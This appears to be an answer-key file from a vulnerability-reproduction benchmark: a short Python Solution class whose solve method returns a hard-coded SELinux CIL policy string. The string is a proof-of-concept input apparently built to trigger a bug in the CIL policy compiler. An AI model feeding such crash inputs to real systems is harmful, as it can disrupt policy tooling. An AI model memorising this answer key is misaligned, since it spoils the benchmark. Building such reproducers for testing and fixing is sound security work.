import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"(block b(class c(p))(type t)(allow t t (c(p)))(macro m((classpermission cp))(classpermissionset s(cp)))(m(c(p))))\n"
        return poc